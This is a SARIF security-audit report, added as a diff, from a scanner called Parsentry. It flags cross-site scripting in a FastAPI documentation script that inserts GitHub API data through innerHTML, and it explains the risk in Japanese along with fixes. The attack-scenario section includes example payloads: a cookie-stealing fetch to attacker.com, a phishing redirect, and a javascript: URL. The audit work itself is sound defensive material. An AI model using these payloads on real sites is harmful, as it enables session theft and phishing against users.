@@ -1,0 +1,81 @@
+{
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json",
+  "version": "2.1.0",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "name": "Parsentry",
+          "version": "0.14.0",
+          "rules": [
+            {
+              "id": "XSS",
+              "name": "Cross-Site Scripting",
+              "shortDescription": {
+                "text": "Untrusted external API data directly inserted into DOM via innerHTML"
+              }
+            }
+          ]
+        }
+      },
+      "results": [
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 0,
+          "level": "error",
+          "message": {
+            "text": "Cross-Site Scripting (XSS) vulnerability: Untrusted GitHub API data inserted into DOM via innerHTML without sanitization at line 170",
+            "markdown": "## XSS脆弱性: GitHub API データの未検証DOM挿入\n\n### 脆弱性の概要\n\nGitHub Search API から取得した外部データが、入力検証やサニタイズなしに直接 `innerHTML` で DOM に挿入されています。これにより、攻撃者が任意の JavaScript コードを実行できる可能性があります。\n\n### 脆弱なコード分析\n\n**コード箇所**: repo/gitea/repositories/dodo/docs/en/docs/js/custom.js, 165-171行目\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${v.html_url}\" target=\"_blank\">★ ${v.stargazers_count} - ${v.full_name}</a> by <a href=\"${v.owner.html_url}\" target=\"_blank\">@${v.owner.login}</a>`\n    ul.append(li)\n})\n```\n\n### PAR (Principal-Action-Resource) フレームワーク分析\n\n#### **Principal（プリンシパル - 信頼できないデータ源）**\n\nGitHub API v3 Search Repositories Endpoint のレスポンス:\n- `v.html_url`: リポジトリへのHTTP URL\n- `v.full_name`: リポジトリの完全名 (e.g., \"user/repo\")\n- `v.stargazers_count`: スター数（数値）\n- `v.owner.html_url`: オーナープロフィールURL\n- `v.owner.login`: オーナーのログイン名\n\n外部API からのレスポンスは信頼できないデータです。特にリポジトリ情報（名前、URL）はユーザーが直接制御可能なため、悪意のあるペイロードを含む可能性があります。\n\n#### **Action（アクション - セキュリティ制御）**\n\n**現状**: セキュリティ制御が **完全に欠如**\n- HTML エスケープ処理: なし\n- 入力バリデーション: なし\n- サニタイズ処理: なし\n- Content Security Policy (CSP): 不明（別ファイルに記載の可能性）\n\nデータは直接テンプレートリテラル内に埋め込まれ、何の検証も経ずに HTML として解釈されます。\n\n#### **Resource（リソース - 危険な操作）**\n\nDOM 要素への `innerHTML` プロパティによる直接 HTML 挿入:\n```javascript\nli.innerHTML = `...${v.html_url}...${v.full_name}...${v.owner.html_url}...${v.owner.login}...`\n```\n\n`innerHTML` はブラウザに HTML を解釈させるため、含まれるスクリプトが実行されます。\n\n### 攻撃シナリオ\n\n#### シナリオ1: 悪意のあるリポジトリの作成\n1. 攻撃者が GitHub で悪意のあるリポジトリを作成\n2. リポジトリの `full_name` を特別に設定 (e.g., `attacker/<img src=x onerror=\"alert(document.cookie)\">`)\n3. FastAPI トピックでタグ付けして、API検索結果に含まれるようにする\n4. 当該ページを訪問したユーザーのクライアント環境でスクリプトが実行される\n5. クッキーやセッショントークンの窃取、CSRF攻撃の実行などが可能\n\n#### シナリオ2: 中間者攻撃(MITM)による改ざん\n1. HTTPS をサポートしていない通信路での MITM\n2. または HTTPS ピンニングの欠如により通信路を盗聴・改ざん\n3. GitHub API レスポンスを改ざんし、ペイロードを注入\n4. ユーザーが訪問するたびにマルウェアが実行される\n\n#### 具体的なペイロード例\n\n```javascript\n// リポジトリ名フィールドに以下を設定\nv.full_name = \"user/<img src=x onerror=\\\"fetch('https://attacker.com/steal?c=' + document.cookie)\\\">\";\n\n// または URL フィールド\nv.html_url = \"javascript:alert('XSS')\";\n\n// オーナー名フィールド\nv.owner.login = \"<svg onload=\\\"window.location='https://attacker.com/phishing'\\\">\";\n```\n\n### 影響範囲\n\n- **認証情報の窃取**: クッキー、ローカルストレージ、セッショントークン\n- **セッションハイジャック**: ユーザーになりすまし可能\n- **フィッシング**: フィッシング ページへのリダイレクト\n- **マルウェア配布**: 悪意のあるスクリプト実行\n- **CSRF 攻撃**: ユーザーに無断でアクション実行\n- **ページ改ざん**: ユーザーに見える情報の改変\n\n### 関連する脅威と分類\n\n- **OWASP**: A03:2021 – Injection\n- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)\n- **CVSS v3.1**: High severity (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N)\n- **MITRE ATT&CK**: \n  - T1055: Process Injection\n  - T1106: Native API (DOM API)\n  - T1583: Acquire Infrastructure\n\n### 推奨される修正\n\n#### 修正1: DOM API を使用（推奨）\n\n```javascript\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    const li = document.createElement('li')\n    \n    // リンク1を作成\n    const a1 = document.createElement('a')\n    a1.href = v.html_url\n    a1.target = '_blank'\n    a1.textContent = `★ ${v.stargazers_count} - ${v.full_name}`\n    \n    // テキスト分割を作成\n    const text = document.createTextNode(' by ')\n    \n    // リンク2を作成\n    const a2 = document.createElement('a')\n    a2.href = v.owner.html_url\n    a2.target = '_blank'\n    a2.textContent = `@${v.owner.login}`\n    \n    // DOM ツリーに追加\n    li.appendChild(a1)\n    li.appendChild(text)\n    li.appendChild(a2)\n    ul.append(li)\n})\n```\n\n**利点**:\n- HTML パースが行われない\n- `textContent` はテキストとして扱われる\n- JavaScript 実行の可能性が完全に排除される\n\n#### 修正2: URL バリデーション + HTML エスケープ\n\n```javascript\n// URL バリデーション関数\nconst isValidUrl = (url) => {\n    try {\n        const parsed = new URL(url)\n        return parsed.protocol === 'http:' || parsed.protocol === 'https:'\n    } catch {\n        return false\n    }\n}\n\n// HTML エスケープ関数\nconst escapeHtml = (text) => {\n    const div = document.createElement('div')\n    div.textContent = text\n    return div.innerHTML\n}\n\ndata.forEach(v => {\n    if (v.full_name === 'tiangolo/fastapi') {\n        return\n    }\n    \n    // URL バリデーション\n    if (!isValidUrl(v.html_url) || !isValidUrl(v.owner.html_url)) {\n        console.warn(`Invalid URL detected: ${v.html_url}`)\n        return\n    }\n    \n    const li = document.createElement('li')\n    li.innerHTML = `<a href=\"${escapeHtml(v.html_url)}\" target=\"_blank\">★ ${escapeHtml(String(v.stargazers_count))} - ${escapeHtml(v.full_name)}</a> by <a href=\"${escapeHtml(v.owner.html_url)}\" target=\"_blank\">@${escapeHtml(v.owner.login)}</a>`\n    ul.append(li)\n})\n```\n\n#### 修正3: Content Security Policy (CSP)\n\nHTML ファイルに以下を追加:\n```html\n<meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'self'; script-src 'self'; img-src 'self' https:; style-src 'self' 'unsafe-inline';\">\n```\n\nこれにより、インラインスクリプトの実行がブロックされます。\n\n### テスト方法\n\n1. リポジトリ名に `<img src=x onerror=alert('XSS')>` を含むテストペイロードを使用\n2. 修正後、ブラウザコンソールで alert が出現しないことを確認\n3. ページの表示が正常に行われることを確認"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js"
+                },
+                "region": {
+                  "startLine": 170
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.9,
+            "principal": "GitHub API v3 REST API (external untrusted source)",
+            "action": "No validation, sanitization, or encoding applied",
+            "resource": "DOM innerHTML property at line 170",
+            "data_flow": "GitHub API response → v object properties → template literal → innerHTML"
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "ruleIndex": 0,
+          "level": "warning",
+          "message": {
+            "text": "innerHTML usage pattern without proper sanitization at line 163",
+            "markdown": "### XSS脆弱性: innerHTML による DOM操作\n\n**問題**: 163行目で`div.innerHTML = '<ul></ul>'`を使用していますが、後続の170行目で信頼できないデータが同じDOMツリーに挿入されます。\n\n**詳細**:\n- **Principal**: ユーザーが制御可能なGitHub APIレスポンス\n- **Action**: HTMLコンテンツ生成時のサニタイズなし\n- **Resource**: DOM操作(`innerHTML`)\n\n**推奨される修正**:\n- `innerHTML` の使用を最小化\n- `createElement` と `appendChild` で動的コンテンツを構築\n- URL属性値の入力バリデーション（URLスキームの検証）"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "repo/gitea/repositories/dodo/docs/en/docs/js/custom.js"
+                },
+                "region": {
+                  "startLine": 163
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.7,
+            "principal": "HTML template literal with external data",
+            "action": "innerHTML property usage without content validation",
+            "resource": "DOM tree at selector '.github-topic-projects'",
+            "data_flow": "GitHub API → dynamic HTML generation → innerHTML assignment"
+          }
+        }
+      ]
+    }
+  ]
+}
